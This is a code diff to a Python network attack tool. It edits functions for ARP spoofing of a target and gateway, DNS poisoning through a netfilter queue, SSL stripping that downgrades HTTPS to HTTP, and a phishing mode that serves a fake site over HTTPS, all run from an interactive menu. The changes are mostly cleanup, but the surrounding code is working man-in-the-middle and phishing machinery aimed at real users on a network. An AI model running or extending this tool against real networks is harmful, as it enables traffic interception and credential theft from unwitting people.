@@ -12,6 +12,7 @@ import threading
 import errno
 import http.server
 import socketserver
+import socket
 import ssl
 import subprocess
 from typing import Optional
@@ -70,7 +71,8 @@ cleanup_state = {
     'ssl_strip_running': False,
     'ssl_httpd': None,
     'proxy_thread': None,
-    'proxy_running': False
+    'proxy_running': False,
+    'proxy_httpd': None
 }
 
 # all the services must be properly stopped and the system state restored
@@ -215,12 +217,11 @@ def restore(destination_ip, source_ip):
 # arp spoofing thread
 
 def arp_spoof_thread(target_ip, gateway_ip):
-    sent_packets = 0
     print(f"[ARP] Spoofing thread started for {target_ip}")
     
     while cleanup_state['arp_running']:
-        if spoof(target_ip, gateway_ip) and spoof(gateway_ip, target_ip):
-            sent_packets += 2
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         time.sleep(ARP_SPOOF_INTERVAL)
     print(f"\n[ARP] Spoofing thread stopped")
 
@@ -291,7 +292,6 @@ def stop_arp_spoofing():
 # dns poisoning thread
 
 def dns_poison_thread():
-    """Background thread for DNS poisoning."""
     try:
         queue = NetfilterQueue()
         cleanup_state['dns_queue'] = queue
@@ -396,16 +396,13 @@ class _RedirectHandler(http.server.BaseHTTPRequestHandler):
 
 
 class _PhishingHandler(http.server.SimpleHTTPRequestHandler):
-    """HTTPS server that serves static files for phishing (non-proxy mode)."""
     phishing_directory: Optional[str] = None
 
     def __init__(self, *args, **kwargs):
-        # Set the directory to serve files from
         directory = self.phishing_directory or os.getcwd()
         super().__init__(*args, directory=directory, **kwargs)
 
     def log_message(self, format, *args):
-        # Log requests
         print(f"[Phishing] {self.client_address[0]} - {args[0] if args else ''}")
 
 
@@ -418,9 +415,6 @@ class _ProxyHandler(http.server.BaseHTTPRequestHandler):
         return
 
     def _proxy_request(self, method='GET', body=None):
-        import socket
-        import ssl
-        
         connect_host = self.target_ip if self.target_ip else self.target_host
         
         try:
@@ -528,12 +522,12 @@ def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file
     socketserver.TCPServer.allow_reuse_address = True
     
     if proxy_mode:
-        # Proxy mode: redirect HTTPS to HTTP
+        # proxy mode (actual ssl stripping)
         _RedirectHandler.target_host = site_to_spoof
         handler_class = _RedirectHandler
         mode_desc = f"redirecting to http://{site_to_spoof}"
     else:
-        # Phishing mode: serve static files over HTTPS
+        # phishing (more like ssl spoofing)
         _PhishingHandler.phishing_directory = phishing_dir
         handler_class = _PhishingHandler
         mode_desc = f"serving phishing content from {phishing_dir}"
@@ -638,9 +632,8 @@ def start_ssl_stripping():
         )
         cleanup_state['dns_thread'].start()
         print(f"[SSL] DNS poisoning auto-started")
-        phishing_dir = None  # Not used in proxy mode
+        phishing_dir = None
     else:
-        # Phishing mode: serve fake site over HTTPS
         print(f"[SSL] PHISHING MODE - will serve fake site over HTTPS")
         phishing_dir = input("Enter path to phishing content directory (default: current dir): ").strip()
         if not phishing_dir:
@@ -669,7 +662,6 @@ def start_ssl_stripping():
 
 
 def stop_ssl_stripping():
-    """Stop SSL stripping."""
     if not cleanup_state['ssl_strip_running']:
         print("[SSL] SSL stripping is not running")
         return
@@ -691,7 +683,6 @@ def stop_ssl_stripping():
 
 
 def _proxy_thread(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = None) -> None:
-    """Background thread for HTTP proxy server."""
     _ProxyHandler.target_host = site_to_spoof
     _ProxyHandler.target_ip = target_ip
     socketserver.TCPServer.allow_reuse_address = True
@@ -725,7 +716,6 @@ def _proxy_thread(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = N
 
 
 def start_proxy(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = None):
-    """Start the HTTP proxy."""
     if cleanup_state['proxy_running']:
         print("[Proxy] Proxy is already running!")
         return
@@ -741,7 +731,6 @@ def start_proxy(bind_ip: str, site_to_spoof: str, target_ip: Optional[str] = Non
 
 
 def stop_proxy():
-    """Stop the HTTP proxy."""
     if not cleanup_state['proxy_running']:
         return
     
@@ -780,7 +769,7 @@ def print_menu(clear_previous=True):
         lines.append("2. Stop DNS poisoning")
     if not cleanup_state['ssl_strip_running']:
         if cleanup_state['dns_running']:
-            lines.append("3. Start SSL stripping")
+            lines.append("3. Start SSL stripping (phishing with custom html)")
         else:
             lines.append("3. Start SSL stripping (proxy)")
     else:
